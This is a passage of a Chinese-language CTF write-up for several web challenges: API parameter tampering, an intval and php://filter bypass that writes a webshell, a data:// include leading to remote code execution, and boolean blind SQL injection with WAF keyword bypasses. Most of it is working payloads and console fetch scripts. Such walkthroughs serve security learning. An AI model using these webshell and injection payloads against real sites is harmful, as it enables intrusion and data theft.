class="variable">$obj</span>-&gt;pass = <span class="string">&quot;ok&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$obj</span>);</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h1 id="三、Geek"><a href="#三、Geek" class="headerlink" title="三、Geek"></a>三、Geek</h1><blockquote>
-<p>接下来会大量用控制台构造 fetch 请求发送 payload，先简介一下 fetch。</p>
-</blockquote>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(目标地址, 配置)</span><br><span class="line"><span class="comment">// 目标地址 = 网址(参数名)+配置(用什么方法、传什么数据)</span></span><br><span class="line"><span class="comment">// 配置可以不写，默认发 GET 请求</span></span><br><span class="line"><span class="comment">// 只有需要 POST、加请求头、传请求体、改 cookie 策略时才需要第二个配置对象</span></span><br></pre></td></tr></table></figure>
-
-<hr>
-<h2 id="一、保卫玉米（Web-前端JS接口-游戏题）"><a href="#一、保卫玉米（Web-前端JS接口-游戏题）" class="headerlink" title="一、保卫玉米（Web-前端JS接口 &#x2F; 游戏题）"></a>一、保卫玉米（Web-前端JS接口 &#x2F; 游戏题）</h2><h3 id="解读"><a href="#解读" class="headerlink" title="解读"></a>解读</h3><p>由题可知 method 为 GET，且只有登记为厨师才能发出接入请求，所以直接在 URL 拼接 <code>/?name=cornguard</code>，登录厨师账号。</p>
-<h3 id="尝试发送（构造-POST-请求）"><a href="#尝试发送（构造-POST-请求）" class="headerlink" title="尝试发送（构造 POST 请求）"></a>尝试发送（构造 POST 请求）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/join&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;</span><br><span class="line">    <span class="string">&#x27;X-HTTP-Method-Override&#x27;</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">    <span class="string">&#x27;Content-Type&#x27;</span>: <span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span></span><br><span class="line">  &#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;action=join&amp;name=cornguard&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="function"><span class="params">t</span>=&gt;</span><span class="variable language_">console</span>.<span class="title function_">log</span>(t))</span><br></pre></td></tr></table></figure>
-
-<p>详解：</p>
-<ul>
-<li>**第一层 fetch(请求地址, 配置对象)**：第一个参数 <code>/join</code> 请求发到哪个地址，第二个 <code>&#123;...&#125;</code> 配置方法、头、body。</li>
-<li>**<code>.method</code>**：请求方法。</li>
-<li>**<code>.headers</code>**：请求头。<code>X-HTTP-Method-Override: POST</code> 告诉服务器”虽然我发的是 POST，但你要按 POST 逻辑处理”——这是本题的绕过关键。</li>
-<li>**<code>Content-Type: application/x-www-form-urlencoded</code>**：告诉服务器 body 里的数据是表单格式（key&#x3D;value&amp;key&#x3D;value）。</li>
-<li><strong>body</strong>：<code>action=join&amp;name=cornguard</code>，相当于 BP post 包里的请求体。</li>
-<li><strong>拿到响应</strong>：<code>.then(r=&gt;r.text())</code> 把响应内容转文本，<code>.then(t=&gt;console.log(t))</code> 打印到控制台。</li>
-</ul>
-<h3 id="好处析"><a href="#好处析" class="headerlink" title="好处析"></a>好处析</h3><p>用控制台不用找 cookie 且会自动带上一些请求头。返回结果提示需要专用浏览器：Corn Terminal。这时要用浏览器插件 Mod Header 改 UA 头：加一个 <code>User-Agent: Corn Terminal</code>。</p>
-<p>改好后再次发送上面的 POST 请求，得到游戏页面。可以提取到游戏文件源码：<code>src=&quot;/static/game.js&quot;</code>，在网页地址后拼接 <code>/static/game.js</code> 进行查询源码获取游戏过程和接口。</p>
-<h3 id="解析游戏源码"><a href="#解析游戏源码" class="headerlink" title="解析游戏源码"></a>解析游戏源码</h3><ol>
-<li><strong>找到接口</strong>：<code>/api/start</code>（开始）、<code>/api/fire</code>（攻击）、<code>/api/state</code>（状态）。<ul>
-<li><code>/api/fire</code> 接口 method: POST，body 为 <code>JSON.stringify(&#123;damage: battle.default_damage&#125;)</code> 传 JSON。</li>
-<li><strong>伤害值用默认的 35，但服务器端根本没校验，我们可以改数值为 999999</strong>。</li>
-</ul>
-</li>
-<li>因为服务器每隔 250ms 就会校验一次状态，所以怪不能一次打死，要把开始和攻击一起自动跑。</li>
-<li><strong>CTF 经验：游戏类题目必看前端 JS，接口和参数全写在里面，找到就能直接调，不用真玩。</strong></li>
-</ol>
-<h3 id="构造自动循环脚本"><a href="#构造自动循环脚本" class="headerlink" title="构造自动循环脚本"></a>构造自动循环脚本</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">async</span> <span class="keyword">function</span> <span class="title function_">autoBattle</span>(<span class="params"></span>) &#123;</span><br><span class="line">  <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/start&#x27;</span>, &#123;<span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>&#125;);</span><br><span class="line">  <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; <span class="number">10</span>; i++) &#123;</span><br><span class="line">    <span class="keyword">let</span> r = <span class="keyword">await</span> <span class="title function_">fetch</span>(<span class="string">&#x27;/api/fire&#x27;</span>, &#123;</span><br><span class="line">      <span class="attr">method</span>:<span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">      <span class="attr">headers</span>:&#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/json&#x27;</span>&#125;,</span><br><span class="line">      <span class="attr">body</span>: <span class="title class_">JSON</span>.<span class="title function_">stringify</span>(&#123;<span class="attr">damage</span>: <span class="number">999999</span>&#125;)</span><br><span class="line">    &#125;);</span><br><span class="line">    <span class="keyword">let</span> d = <span class="keyword">await</span> r.<span class="title function_">json</span>();</span><br><span class="line">    <span class="variable language_">console</span>.<span class="title function_">log</span>(i, d.<span class="property">message</span> || d.<span class="property">error</span>);</span><br><span class="line">    <span class="keyword">if</span> (d.<span class="property">flag</span>) &#123; <span class="variable language_">console</span>.<span class="title function_">log</span>(<span class="string">&#x27;FLAG:&#x27;</span>, d.<span class="property">flag</span>); <span class="keyword">break</span>; &#125;</span><br><span class="line">    <span class="keyword">if</span> (d.<span class="property">error</span> === <span class="string">&#x27;BATTLE_ENDED&#x27;</span>) <span class="keyword">break</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="title function_">autoBattle</span>()</span><br></pre></td></tr></table></figure>
-
-<h3 id="基本函数讲解"><a href="#基本函数讲解" class="headerlink" title="基本函数讲解"></a>基本函数讲解</h3><ul>
-<li><code>function</code> 定义一个”小功能块”，相当于造一个工具。</li>
-<li><code>autoBattle</code> 给这个工具起个名叫”自动战斗”。</li>
-<li><code>async</code> 告诉别人：这个工具做事时会”等一下”（等服务器回复），不能急。</li>
-<li><code>r</code> 是服务器返回的原始数据，<code>.json()</code> 把它整理成我们能读懂的 JSON。</li>
-<li><code>await</code> 等整理完再往下走。</li>
-<li><code>let d =</code> 把整理好的数据存起来起个名字叫 d。</li>
-<li><code>i</code> 现在打到第几轮了（0、1、2…）。</li>
-<li><code>d.message</code> 服务器说的好消息，<code>d.error</code> 坏消息。</li>
-<li><code>JSON.stringify</code> 是翻译器：因为服务器和浏览器之间只能传文字，不能传复杂数据结构，JSON 就是一种大家约定好的写法。</li>
-</ul>
-<h3 id="什么时候用控制台-vs-什么时候不用"><a href="#什么时候用控制台-vs-什么时候不用" class="headerlink" title="什么时候用控制台 vs 什么时候不用"></a>什么时候用控制台 vs 什么时候不用</h3><table>
-<thead>
-<tr>
-<th>场景</th>
-<th>用什么</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>手动构造请求、绕限制</td>
-<td>Burp Repeater</td>
-</tr>
-<tr>
-<td>批量跑、自动爆破</td>
-<td>Python 脚本</td>
-</tr>
-<tr>
-<td>直接访问一个 URL</td>
-<td>浏览器地址栏</td>
-</tr>
-</tbody></table>
-<table>
-<thead>
-<tr>
-<th>什么时候用浏览器控制台</th>
-<th>为什么</th>
-</tr>
-</thead>
-<tbody><tr>
-<td>发 POST 请求到当前网站</td>
-<td>浏览器自动带 cookie、自动处理同源策略</td>
-</tr>
-<tr>
-<td>调网站的 API 接口</td>
-<td>你在网站页面上，直接 fetch 就行</td>
-</tr>
-<tr>
-<td>写 webshell</td>
-<td>需要带着你登录后的 session cookie</td>
-</tr>
-</tbody></table>
-<hr>
-<h2 id="二、ezphp（Web-文件写入漏洞-intval-绕过-php-filter）"><a href="#二、ezphp（Web-文件写入漏洞-intval-绕过-php-filter）" class="headerlink" title="二、ezphp（Web-文件写入漏洞 &#x2F; intval 绕过 + php:&#x2F;&#x2F;filter）"></a>二、ezphp（Web-文件写入漏洞 &#x2F; intval 绕过 + php:&#x2F;&#x2F;filter）</h2><h3 id="第一关：intval-进制绕过"><a href="#第一关：intval-进制绕过" class="headerlink" title="第一关：intval 进制绕过"></a>第一关：intval 进制绕过</h3><p>源码关键逻辑：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$num</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;num&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">is_string</span>(<span class="variable">$num</span>)) <span class="keyword">die</span>(<span class="string">&quot;xiexie 不喜欢数组。&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$num</span> == <span class="number">411413</span>) <span class="keyword">die</span>(<span class="string">&quot;这都无法做到吗！&quot;</span>);       <span class="comment">// 宽松比较</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">preg_match</span>(<span class="string">&quot;/[a-z\\\\.]/i&quot;</span>, <span class="variable">$num</span>)) <span class="keyword">die</span>(<span class="string">&quot;xiexie感觉你应该没办法了！&quot;</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="title function_ invoke__">strpos</span>(<span class="variable">$num</span>, <span class="string">&quot;0&quot;</span>)) <span class="keyword">die</span>(<span class="string">&quot;玉米说以防万一再试试这个！&quot;</span>);  <span class="comment">// 必须含0</span></span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">intval</span>(<span class="variable">$num</span>, <span class="number">0</span>) === <span class="number">411413</span>)&#123;                    <span class="comment">// 严格比较</span></span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;ezphp_level1&#x27;</span>] = <span class="literal">true</span>;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: death.php&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-
-<p>限制：</p>
-<ol>
-<li><code>$num == 411413</code> → 不能直接等于 411413（宽松比较）</li>
-<li><code>preg_match(&quot;/[a-z\\.]/i&quot;)</code> → 不能有字母和点</li>
-<li><code>strpos($num,&quot;0&quot;)</code> → 必须含 0，且 0 不能在第 0 位</li>
-<li><code>intval($num, 0) === 411413</code> → intval 自动进制解析后必须等于 411413</li>
-</ol>
-<h3 id="intval-的进制规则"><a href="#intval-的进制规则" class="headerlink" title="intval 的进制规则"></a>intval 的进制规则</h3><p><code>intval($num, 0)</code> 按数字前缀自动判断进制：</p>
-<ul>
-<li><code>0x</code> 开头 → 十六进制</li>
-<li><code>0</code> 开头 → 八进制</li>
-<li>其他 → 十进制</li>
-</ul>
-<p>411413 要让 intval 自动进制解析后等于它，且字符串里必须包含 0 又不能有字母，所以应该用八进制。411413 的八进制是 <code>01443425</code>。</p>
-<p>但 0 又不能在首位（strpos 要求 0 不在第 0 位），所以应加 <code>+</code>。在 PHP 函数中解析数字时会先识别符号判断正负号，后面沿用判断得到的数：<code>+01443425</code> → 因为有了 <code>+</code> 占了零号位，故 0 在一号位，成功绕过 <code>intval(&quot;+123&quot;)</code> 结果是 123。</p>
-<p><strong>第一关 payload</strong>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?num=+01443425</span><br></pre></td></tr></table></figure>
-
-<p>跳转 death.php。</p>
-<h3 id="第二关：写-webshell"><a href="#第二关：写-webshell" class="headerlink" title="第二关：写 webshell"></a>第二关：写 webshell</h3><p>第二关 <code>death.php</code> 会把你传的 filename 和 content 写进文件，但无论写什么都会自动加上 <code>&lt;?php exit;?&gt;</code>：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$written</span> = @<span class="title function_ invoke__">file_put_contents</span>(<span class="variable">$filename</span>, <span class="string">&quot;&lt;?php exit;?&gt;&quot;</span> . <span class="variable">$content</span>);</span><br></pre></td></tr></table></figure>
-
-<h4 id="的作用"><a href="#的作用" class="headerlink" title="&lt;?php exit;?&gt; 的作用"></a><code>&lt;?php exit;?&gt;</code> 的作用</h4><p>如果没绕过它，我们写入的文件开头就有 <code>&lt;?php exit;?&gt;</code>，会让 PHP 代码直接退出，不执行后面的任何内容 → webshell 写不进去。</p>
-<h4 id="绕过方法：php-filter"><a href="#绕过方法：php-filter" class="headerlink" title="绕过方法：php:&#x2F;&#x2F;filter"></a>绕过方法：php:&#x2F;&#x2F;filter</h4><p>用 <code>php://filter</code> 协议给文件流加过滤器：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/death.php?filename=php://filter/write=convert.base64-decode/resource=shell.php</span><br></pre></td></tr></table></figure>
-
-<ul>
-<li><code>php://filter</code>：PHP 的伪协议，用来给文件流加过滤器。</li>
-<li><code>write=convert.base64-decode</code>：写文件时启用过滤器 <code>convert.base64-decode</code>。</li>
-<li><code>resource=shell.php</code>：最终写到 shell.php 这个文件。</li>
-<li>作用：在后面的 content 拼接后再执行编码，会把 <code>&lt;?php exit;?&gt;</code> 这段字符先 base64 解码成乱码，从而绕过它。</li>
-</ul>
-<p>我们要写入的内容是 <code>&lt;?php system(&#39;cat /flag&#39;);?&gt;</code>，它的 base64 编码是：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==</span><br></pre></td></tr></table></figure>
-
-<h4 id="base64-拼接乱码原理"><a href="#base64-拼接乱码原理" class="headerlink" title="base64 拼接乱码原理"></a>base64 拼接乱码原理</h4><p><code>convert.base64-decode</code> 会只挑出合法的 base64 字符（A-Z a-z 0-9 + &#x2F; &#x3D;），其他全部忽略。<code>&lt;?php exit;?&gt;</code> 里只有 <code>php</code>、<code>exit</code>、<code>?&gt;</code> 中的 <code>p h p e x i t</code> 是合法 base64 字符。</p>
-<p>把 <code>PD9...</code> 前面要随便加一个字符凑齐 8 个合法 base64 字符（因为 base64 是 4 个字符一组解码），这样解出来才是乱码，从而绕过 <code>&lt;?php exit;?&gt;</code>。乱码不被检测的原因：PHP 只认 <code>&lt;?php</code> 和 <code>?&gt;</code> 之间的内容。</p>
-<h3 id="完整-payload（控制台发送）"><a href="#完整-payload（控制台发送）" class="headerlink" title="完整 payload（控制台发送）"></a>完整 payload（控制台发送）</h3><figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/death.php?filename=php://filter/write=convert.base64-decode/resource=shell.php&#x27;</span>, &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;content=aPD9waHAgc3lzdGVtKCdjYXQgL2ZsYWcnKTs/Pg==&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>
-
-<p>然后访问 <code>/shell.php</code> 读到 flag。</p>
-<blockquote>
-<p>要写 <code>.php</code> 文件后缀，服务器才会执行里面的 PHP 代码。</p>
-</blockquote>
-<hr>
-<h2 id="三、术之尽头（Web-源码审计-data-RCE-提权）"><a href="#三、术之尽头（Web-源码审计-data-RCE-提权）" class="headerlink" title="三、术之尽头（Web-源码审计 &#x2F; data:&#x2F;&#x2F; RCE + 提权）"></a>三、术之尽头（Web-源码审计 &#x2F; data:&#x2F;&#x2F; RCE + 提权）</h2><h3 id="1-robots-txt-找隐藏路径"><a href="#1-robots-txt-找隐藏路径" class="headerlink" title="1. robots.txt 找隐藏路径"></a>1. robots.txt 找隐藏路径</h3><p>打开页面是纯静态画廊，攻击入口一定藏在别处。<code>robots.txt</code> 是网站的”地图说明”，告诉搜索引擎哪些目录能爬、哪些不能。但网站不想让搜索引擎爬的地方，往往就是藏秘密的地方。</p>
-<p>访问 <code>/robots.txt</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">User-agent: *</span><br><span class="line">Disallow: /flllaaag.php</span><br></pre></td></tr></table></figure>
-
-<h3 id="2-陷阱页"><a href="#2-陷阱页" class="headerlink" title="2. 陷阱页"></a>2. 陷阱页</h3><p>继续访问 <code>/flllaaag.php</code>，返回 403 Forbidden”此路不通”，这是一个陷阱页，真正的入口不在这。</p>
-<h3 id="3-找入口（找-JS-文件）"><a href="#3-找入口（找-JS-文件）" class="headerlink" title="3. 找入口（找 JS 文件）"></a>3. 找入口（找 JS 文件）</h3><p>静态页面没有按钮、没有输入框，看不到攻击入口。但页面加载时会加载 JS 文件，JS 里经常藏着隐藏接口地址、加密路径、注释提示。</p>
-<p>查看源码看到 JS 文件路径：<code>/assets/robots_min.js</code>。打开后里面是一串数字：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> k=<span class="number">17</span>, a=[<span class="number">61</span>,<span class="number">165</span>,<span class="number">99</span>,<span class="number">109</span>,<span class="number">100</span>,<span class="number">116</span>,<span class="number">114</span>,<span class="number">112</span>,<span class="number">123</span>,<span class="number">125</span>,<span class="number">116</span>,<span class="number">125</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">125</span>,<span class="number">116</span>,<span class="number">127</span>,<span class="number">118</span>,<span class="number">115</span>,<span class="number">97</span>,<span class="number">121</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">117</span>,<span class="number">116</span>,<span class="number">127</span>,<span class="number">116</span>,<span class="number">115</span>,<span class="number">116</span>,<span class="number">112</span>,<span class="number">117</span>,<span class="number">116</span>];</span><br><span class="line"><span class="variable language_">console</span>.<span class="title function_">log</span>(a.<span class="title function_">map</span>(<span class="function"><span class="params">x</span>=&gt;</span><span class="title class_">String</span>.<span class="title function_">fromCharCode</span>(x*k)).<span class="title function_">join</span>(<span class="string">&#x27;&#x27;</span>));</span><br><span class="line"><span class="comment">// /truueechallenge.php</span></span><br></pre></td></tr></table></figure>
-
-<p>JS 文件里的代码是自动执行的，但它把结果打印到控制台了。我们直接把这段代码复制到控制台跑一遍，就能看到解码结果：<code>/truueechallenge.php</code>。</p>
-<h3 id="4-分析源码"><a href="#4-分析源码" class="headerlink" title="4. 分析源码"></a>4. 分析源码</h3><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="variable">$cmd</span> = <span class="title function_ invoke__">trim</span>(<span class="string">&lt;&lt;&lt;PHP</span></span><br><span class="line"><span class="string">&lt;?php @eval(<span class="subst">$_POST</span>[&#x27;cmd&#x27;]); ?&gt;</span></span><br><span class="line"><span class="string">PHP</span>);</span><br><span class="line"><span class="keyword">if</span>(!<span class="keyword">isset</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]))&#123;</span><br><span class="line">    <span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">exit</span>(<span class="string">&quot;Please include your file.&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$file</span> = <span class="title function_ invoke__">str_replace</span>(<span class="string">&#x27; &#x27;</span>,<span class="string">&#x27;&#x27;</span>,<span class="variable">$_GET</span>[<span class="string">&#x27;file&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">base64_decode</span>(<span class="title function_ invoke__">substr</span>(<span class="variable">$file</span>, <span class="number">25</span>, <span class="literal">true</span>)) !== <span class="variable">$cmd</span>)&#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&quot;hacked&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">include</span> <span class="variable">$file</span>;</span><br></pre></td></tr></table></figure>
-
-<p>代码做了什么：</p>
-<ol>
-<li>取 file 参数的第 25 个字符之后的内容。</li>
-<li>把这段内容做 base64 解码。</li>
-<li>解码结果必须等于写死的 webshell：<code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code></li>
-<li>校验通过后，<code>include $file</code>。</li>
-</ol>
-<h3 id="5-构造-payload"><a href="#5-构造-payload" class="headerlink" title="5. 构造 payload"></a>5. 构造 payload</h3><p><code>data://text/plain;base64,</code> 正好 25 个字符！所以 file 参数 &#x3D; <code>data://text/plain;base64,</code> + webshell 的 base64 编码。</p>
-<p>webshell <code>&lt;?php @eval($_POST[&#39;cmd&#39;]); ?&gt;</code> 的 base64 编码：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PD9waHAgQGV2YWwoJF9QT1NUWydjbWQnXSk7ID8+</span><br></pre></td></tr></table></figure>
-
-<p>控制台发送完整 payload：</p>
-<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> file = <span class="string">&quot;data://text/plain;base64,&quot;</span> + <span class="title function_">btoa</span>(<span class="string">&#x27;&lt;?php eval($_POST[\&#x27;cmd\&#x27;]); ?&gt;&#x27;</span>);</span><br><span class="line"><span class="title function_">fetch</span>(<span class="string">&#x27;/truueechallenge.php?file=&#x27;</span> + <span class="built_in">encodeURIComponent</span>(file), &#123;</span><br><span class="line">  <span class="attr">method</span>: <span class="string">&#x27;POST&#x27;</span>,</span><br><span class="line">  <span class="attr">headers</span>: &#123;<span class="string">&#x27;Content-Type&#x27;</span>:<span class="string">&#x27;application/x-www-form-urlencoded&#x27;</span>&#125;,</span><br><span class="line">  <span class="attr">body</span>: <span class="string">&#x27;cmd=system(&quot;id&quot;);&#x27;</span></span><br><span class="line">&#125;).<span class="title function_">then</span>(<span class="function"><span class="params">r</span>=&gt;</span>r.<span class="title function_">text</span>()).<span class="title function_">then</span>(<span class="variable language_">console</span>.<span class="property">log</span>)</span><br></pre></td></tr></table></figure>
-
-<blockquote>
-<p>注意要用 <code>encodeURIComponent</code>，因为 URL 里的 <code>+</code>、<code>,</code>、<code>/</code> 等字符会被浏览器解析错，所以要编码。</p>
-</blockquote>
-<h3 id="6-先查-RCE-是否成功"><a href="#6-先查-RCE-是否成功" class="headerlink" title="6. 先查 RCE 是否成功"></a>6. 先查 RCE 是否成功</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">uid=33(www-data) gid=33(www-data) groups=33(www-data)</span><br></pre></td></tr></table></figure>
-
-<p>这是 Linux <code>id</code> 命令返回的结果，说明我们现在是以 <strong>www-data</strong> 用户身份在服务器上执行命令。www-data 是运行 Web 服务（Apache&#x2F;Nginx）的用户，权限很低：能读网站文件、能执行一些基本命令，但不能读 root 的文件、不能改系统配置。</p>
-<h3 id="7-再查-flag-在哪"><a href="#7-再查-flag-在哪" class="headerlink" title="7. 再查 flag 在哪"></a>7. 再查 flag 在哪</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;find / -iname &#x27;*flag*&#x27; 2&gt;/dev/null&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>结果一大堆，但只有最后一个 <code>/tmp/flag</code> 是题目特意放的。</p>
-<p>查权限：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">cmd=system(&quot;ls -la /tmp/flag; ls -la /var/www/html/&quot;);</span><br></pre></td></tr></table></figure>
-
-<p>看到 <code>/tmp/flag</code> 权限是 <code>-rw------- root root</code>，只有 root 能读，我们是 www-data 读不了。</p>
-<h3 id="8-提权思路"><a href="#8-提权思路" class="headerlink" title="8. 提权思路"></a>8. 提权思路</h3><p>往 primary 放 L-文件和软链，等 root 的 cp 循环复制 flag 到 marstream，访问 <code>/marstream/a</code> 拿 flag。</p>
-<hr>
-<h2 id="四、丹特丽安の書架（Web-布尔盲注-WAF-关键字绕过）"><a href="#四、丹特丽安の書架（Web-布尔盲注-WAF-关键字绕过）" class="headerlink" title="四、丹特丽安の書架（Web-布尔盲注 &#x2F; WAF 关键字绕过）"></a>四、丹特丽安の書架（Web-布尔盲注 &#x2F; WAF 关键字绕过）</h2><p><strong>考点：MySQL 布尔盲注 + WAF 关键字绕过</strong></p>
-<h3 id="一步步操作"><a href="#一步步操作" class="headerlink" title="一步步操作"></a>一步步操作</h3><ol>
-<li><p><strong>确认注入点</strong>：</p>
-<ul>
-<li><code>?id=6&#39; &amp;&amp; 1=1 &amp;&amp; &#39;1&#39;=&#39;1</code> → HIT（回显正常）</li>
-<li><code>?id=6&#39; &amp;&amp; 1=2 &amp;&amp; &#39;1&#39;=&#39;1</code> → MISS（回显异常）</li>
-<li>Oracle：响应里有”verdict”字段。</li>
-</ul>
-</li>
-<li><p><strong>WAF 绕过（血泪教训）</strong>：</p>
-<ul>
-<li>AND 被拦 → 必须用 <code>&amp;&amp;</code></li>
-<li><code>select</code> → <code>/*!select*/</code></li>
-<li><code>from</code> → <code>/*!from*/</code></li>
-<li><code>limit</code> → <code>/*!limit*/</code></li>
-</ul>
-</li>
-<li><p><strong>枚举</strong>：</p>
-<ul>
-<li>当前数据库有 security 表。</li>
-<li>security 表有多行！（之前一直 LIMIT 1 只看第一行假数据）</li>
-</ul>
-</li>
-<li><p><strong>逐行扫描找含 flag 的行</strong>：</p>
-</li>
-</ol>
-<figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">instr(<span class="comment">/*!select*/</span> syc_flag <span class="comment">/*!from*/</span> security <span class="comment">/*!limit*/</span> <span class="keyword">offset</span>,<span class="number">1</span>),<span class="string">&#x27;&#123;&#x27;</span>)<span class="operator">&gt;</span><span class="number">0</span></span><br><span class="line"><span class="comment">-- offset=5（第6行）HIT！</span></span><br></pre></td></tr></table></figure>
-
-<ol start="5">
-<li><strong>逐位提取 flag</strong>：<ul>
-<li>开头确认 <code>SYC&#123;</code>，长度 41。</li>
-<li>逐字符匹配小写字母+数字+<code>-</code>。</li>
-</ul>
-</li>
-</ol>
